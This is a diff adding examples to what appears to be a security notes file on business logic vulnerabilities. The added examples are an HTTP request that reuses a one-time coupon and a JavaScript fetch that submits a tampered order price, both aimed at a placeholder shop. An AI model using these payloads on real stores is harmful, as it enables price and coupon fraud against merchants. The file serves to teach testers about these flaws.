@@ -8948,7 +8948,53 @@ Business logic vulnerabilities arise when an attacker exploits flaws in the inte
 - 🔁 Order processing  
 - 📦 Inventory systems  
 - 🔐 Access control logic  
-- 📝 User account and subscription handling  
+- 📝 User account and subscription handling
+
+  **Example Exploit Code – Reusing a One-Time Coupon:**
+
+```http
+POST /checkout/apply-coupon HTTP/1.1
+Host: vulnerable-shop.com
+Content-Type: application/json
+Cookie: sessionid=valid_user_session
+
+{
+  "coupon_code": "ONETIME50"
+}
+```
+- Repeat the same request multiple times or right before completing the payment to apply the discount repeatedly.
+
+**Client-side Manipulation Example – Changing Product Price:**
+
+```js
+// Original product JSON from server
+{
+  "product_id": "123",
+  "price": 100,
+  "quantity": 1
+}
+
+// Manipulated payload before submission
+{
+  "product_id": "123",
+  "price": 1,
+  "quantity": 100
+}
+
+// Submit manipulated order using browser console or intercepted request
+fetch('/order/submit', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    product_id: "123",
+    price: 1,
+    quantity: 100
+  })
+});
+
+```
 
 **Steps to Reproduce:**  
 1. Analyze the business workflow (e.g., shopping cart, registration process).  
